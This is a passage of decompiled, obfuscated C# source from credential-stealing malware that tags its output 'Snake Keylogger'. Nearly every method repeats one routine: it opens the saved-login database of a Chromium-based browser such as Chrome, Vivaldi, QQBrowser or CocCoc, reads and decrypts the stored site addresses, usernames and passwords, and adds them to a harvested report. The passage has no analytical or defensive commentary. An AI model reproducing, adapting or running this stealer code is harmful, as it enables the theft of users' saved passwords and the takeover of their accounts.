          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: 7Star\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ɮ\uFFFD\uFFFDݝ\u07B8()
    {
      string path = Interaction.Environ("APPDATA") + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Sleipnir\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Bߟ\uFFFDс\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\CatalinaGroup\\Citrio\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Citrio\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u05C1œj恁\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome SxS\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Chrome Canary\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ƚ\uDB0A\uDEBAߟמ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Google Chrome\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ɢjۣأ\u0097()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Coowon\\Coowon\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Coowon\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ѕ\u07FB\u005Eœٷ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\CocCoc\\Browser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: CocCoc\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 盀ŲՄē\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\uCozMedia\\Uran\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Uran\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 븤ҏ\uFFFD꾯\u0040()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Tencent\\QQBrowser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: QQ\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u07A8\uFFFDOӤᔖ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Orbitum\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Orbitum\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void BBמі\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Slimjet\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Slimjet\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDջױ\u0026\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Iridium\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Iridium\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ߟŁ\uFFFDɢأ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Vivaldi\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Vivaldi\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ҡ\uD9D8\uDDB5븤ި()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chromium\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Iron\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDľթל\uFFFD()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chromium\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Chromium\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDëʤ؜\u061D()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GhostBrowser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
